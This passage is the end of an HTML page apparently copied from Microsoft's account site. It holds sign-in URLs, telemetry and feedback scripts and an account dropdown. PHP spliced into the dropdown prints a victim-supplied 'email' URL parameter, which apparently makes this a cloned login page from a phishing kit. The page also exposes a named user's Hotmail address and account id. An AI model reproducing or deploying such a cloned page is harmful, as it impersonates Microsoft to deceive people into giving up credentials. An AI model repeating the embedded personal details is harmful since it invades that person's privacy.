            'Url': 'https\x3a\x2f\x2fwww.microsoft.com\x2fservices\x2fapi\x2fv2\x2fsuggest',
            'ClientId': '1A3B4873-9046-4833-982A-65FAE59682B8',
            'ProductCount': 3,
        };
    </script>
    <script src="about_files/site"></script>

    <script src="about_files/experiments-globaloptimizely"></script>

    
    

    
 
<!--[if lte IE 8]>
    <script src="https://assets.onestore.ms/cdnfiles/onestorerolling-1610-27000/shell/common/js/shell_ie8.js"></script>
<![endif]-->



<script async="" src="about_files/meversion"></script>

<script src="about_files/shellservice.js"></script>

    <script type="text/javascript">
        function setLoadScriptResult(name, isSuccess) {
            setTimeout(function() {
                window.portalQos.reportRawEvent({
                    name: 'Ms.Webi.MeePortal.LoadScript',
                    content: {
                        'Ms.Webi.MeePortal.LoadScript': {
                            scriptName: name,
                            success: isSuccess
                        }
                    }
                });
            }, 0);
        }

        (window.msCommonShell && setLoadScriptResult("UHF", true)) || setLoadScriptResult("UHF", false);
    </script>
    
    

<script id="shared-shell-init" type="text/javascript">
    (function () {
        var myShellOptions = {
            meControlOptions: {
                isINT: false,
                rpData: {
                    msaInfo: {
                        signInUrl: 'https\x3a\x2f\x2flogin.live.com\x2flogin.srf\x3fwa\x3dwsignin1.0\x26rpsnv\x3d13\x26ct\x3d1478462460\x26rver\x3d6.7.6636.0\x26wp\x3dMBI_SSL\x26wreply\x3dhttps\x3a\x252f\x252faccount.microsoft.com\x252fauth\x252fcomplete-signin\x253fru\x253dhttps\x25253a\x25252f\x25252faccount.microsoft.com\x25252f\x25253frefd\x25253daccount.microsoft.com\x252526refp\x25253dhome-about-index\x26lc\x3d1033\x26id\x3d292666\x26lw\x3d1\x26fl\x3deasi2',
                        signOutUrl: 'https\x3a\x2f\x2flogin.live.com\x2flogout.srf\x3fct\x3d1478462461\x26rver\x3d6.7.6636.0\x26lc\x3d1033\x26id\x3d292666\x26ru\x3dhttps\x3a\x252F\x252Faccount.microsoft.com\x252Fauth\x252Fcomplete-signout\x253Fru\x253Dhttps\x25253a\x25252f\x25252faccount.microsoft.com\x25252f\x25253frefd\x25253daccount.microsoft.com\x252526refp\x25253dhome-about-index',
                        meUrl: 'https\x3a\x2f\x2flogin.live.com\x2fMe.srf\x3fwa\x3dwsignin1.0\x26rpsnv\x3d13\x26ct\x3d1478462460\x26rver\x3d6.7.6636.0\x26wp\x3dMBI_SSL\x26wreply\x3dhttps\x3a\x252F\x252Faccount.microsoft.com\x252Fauth\x252Fcomplete-signin\x26lc\x3d1033\x26id\x3d292666',
                    }
                },
                userData:
                {
                    firstName: 'walter',
                    lastName: 'gate',
                    memberName: 'waltergate01\x40hotmail.com',
                    cid: 'a0a5600f5bd6d7b3',
                    authenticatedState: '1'
                },
            },
            events:
            {
                onEventLog: MeePortal.SiteLayout.UhfEventLogCallback
            },
                
                searchSuggestCallback: MeePortal.SiteLayout.UhfSearchSuggestionCallback,
                
            currentMenuItemId: 'sharedshell-home'
        };

        function setShellOptions(shellOptions){
            if (window.msCommonShell) {
                shellOptions.meControlOptions.userData.idp = window.msCommonShell.SupportedAuthIdp.MSA;
                window.msCommonShell.load(shellOptions);
            }
            else {
                window.onShellReadyToLoad = function () {
                    window.onShellReadyToLoad = null;
                    setShellOptions(shellOptions);
                }
            }
        }

        setShellOptions(myShellOptions);
    })();
</script>

    <script type="text/javascript">
        function setLoadScriptResult(name, isSuccess) {
            setTimeout(function() {
                window.portalQos.reportRawEvent({
                    name: 'Ms.Webi.MeePortal.LoadScript',
                    content: {
                        'Ms.Webi.MeePortal.LoadScript': {
                            scriptName: name,
                            success: isSuccess
                        }
                    }
                });
            }, 0);
        }

        (window.MSA && window.MSA.MeControl && setLoadScriptResult("MeControl", true)) || setLoadScriptResult("MeControl", false);
    </script>

    
<script type="text/javascript">

    (function() {
        // scenario measurement: user sends feedback!
        var userInitiatedFeedback;

        function initFeedback() {
            
            // register feedback event schema via jsll._registerSchema
            window.portalQos.registerRawEventSchemas
            ([
                {
                    name: 'Ms.Webi.MeePortal.UserFeedback',
                    'Ms.Webi.MeePortal.UserFeedback':
                    {
                        part: 'C',
                        def:
                        {
                            fields:
                            [
                                {
                                    req: true,
                                    name: 'feedback_activityId',
                                    type: 'string'
                                },
                                {
                                    name: 'feedback_pageid',
                                    type: 'string'
                                },
                                {
                                    name: 'feedback_message',
                                    type: 'string'
                                },
                                {
                                    name: 'feedback_propbag',
                                    type: 'string'
                                }
                            ]
                        }
                    }
                }
            ]);

            $.portalAjaxGet({
                serviceName: "Feedback",
                operationName: "Feedback_GetStrings",
                url: '/feedback',
                contentType: "application/json",
            })
            .done(function (data) {
                // Initialize feedback control 
                MeePortal.Feedback.control.init({
                    id: 'Ms.Webi.MeePortal.UserFeedback',
                    activityid: 'HcTPrdbbV0y0PpA9.2.20',
                    jquery: $,
                    feedbackFormStrings: data,
                    onSendFeedback: sendFeedback,
                    onSendTelemetry: sendTelemetry
                });
            });

        }
        
        function sendTelemetry(data) {

            if (data.eventType == 'qos') {

                switch (data.actionId) {

                    case 'FeedbackInitializationFail':
                    case 'FeedbackRenderingFail':
                    var httpStatusCode = data.qosEvent.successStatus ? 200 : 500;

                    window.portalQos.reportOutgoingApi({
                        isSuccess: data.qosEvent.successStatus,
                        latencyMs: data.qosEvent.duration,
                        requestUri: window.document.location.href,
                        serviceName: 'Feedback',
                        serviceType: 'Ms.Webi.MeePortal.UserFeedback',
                        operationName: data.actionId,
                        currentOperationName: 'Feedback',
                        httpMethod: 'GET',
                        contentType: 'text/javascript',
                        serviceErrorCode: httpStatusCode,
                        errorMessage: data.qosEvent.successStatus ? '' : data.message,
                        httpStatusCode: httpStatusCode.toString()
                    });

                    break;
                }
            } else if (data.eventType == 'bici') {

                switch (data.actionId) {

                    // scenario to measure how many users click feedback
                case 'FeedbackStart':
                    userInitiatedFeedback = window.portalScenarios.beginScenario("Global", "UserInitiatedFeedback");
                    break;

                // scenario to measure how many users click cancel
                case 'FeedbackCancel':
                    window.portalScenarios.cancelScenario({ area: "Global", name: userInitiatedFeedback, isSuccess: true });
                    break;

                // scenario to measure how many users send feedback successfully
                case 'FeedbackSend':
                    window.portalScenarios.endScenario({ area: "Global", name: userInitiatedFeedback, isSuccess: true });
                    break;
                }
            }
        }

        function sendFeedback(data) {

            var event = {
                name: 'Ms.Webi.MeePortal.UserFeedback',
                content: {
                    'Ms.Webi.MeePortal.UserFeedback': {
                        feedback_activityId: data.content.id,
                        feedback_pageid: data.content.pageid,
                        feedback_message: data.content.message,
                        feedback_propbag: JSON.stringify(data.content.systemInfo)
                    }
                }
            };

            window.portalQos.reportRawEvent(event);
        }

        function disposeFeedback() {
            MeePortal.Feedback.control.dispose();
        }

        $(window).load(initFeedback);
       
        $(window).unload(disposeFeedback);
    }());
</script>
    
    

    <!-- ServedBy: kRt43TPskDWjqKIV2Em1U3y8mhxO5e5Su5GU3uJZw+2SLYi+27leSVxEdee3PzYvzI6KmNlu5TEugPXe6z6TiA==; ActivityId: HcTPrdbbV0y0PpA9.2.20 -->

<div id="meControlDropdown" class="msame_Drop_root" style="display: none;"><div class="msame_Drop_topb"></div><div class="msame_Drop_content"><div class="msame_Drop_active"><div class="msame_Drop_active_pic"><div class="msame_Drop_active_piccont"><div class="msame_Drop_active_picframe"><a href="#" title="Update your photo"><img role="presentation" src="about_files/msa_enabled.png"></a></div></div></div><div class="msame_Drop_active_right"><div class="msame_TxtTrunc msame_Drop_active_name"<?php if(isset($_GET['email'])){print sanitizer($_GET['email']);} ?></div><div class="msame_TxtTrunc msame_Drop_active_email"><?php if(isset($_GET['email'])){print sanitizer($_GET['email']);} ?></div></div></div><div class="msame_Drop_rewards" style="display: none;"></div><div class="msame_Drop_account"><div id="msame_si0" class="msame_Drop_SI"><a href="https://account.microsoft.com/?ref=MeControl&amp;lang=en-US&amp;partnerId=amc&amp;partnerDomain=account.microsoft.com" target="" class="msame_TxtTrunc">View account</a></div></div><div class="msame_Drop_links" style="display: none;"><div class="msame_Drop_links_list"></div></div><div class="msame_Drop_signIn"><div id="msame_si2" class="msame_Drop_SI"><a href="#" target="" class="msame_TxtTrunc">Sign in with another account</a></div></div><div class="msame_Drop_signOut"><div id="msame_si1" class="msame_Drop_SI"><a href="#" target="" class="msame_TxtTrunc">Sign out</a></div></div><div class="msame_Drop_accts" style="display: none;"><div class="msame_Drop_sep"></div><div class="msame_Drop_accts_list"></div></div></div></div><iframe src="about_files/t.htm" style="display: none;" id="telframe9"></iframe><iframe src="about_files/t_002.htm" style="display: none;" id="telframe10"></iframe><iframe src="about_files/t_003.htm" style="display: none;" id="telframe11"></iframe><iframe src="about_files/t_004.htm" style="display: none;" id="telframe12"></iframe><iframe src="about_files/t_005.htm" style="display: none;" id="telframe13"></iframe></body></html>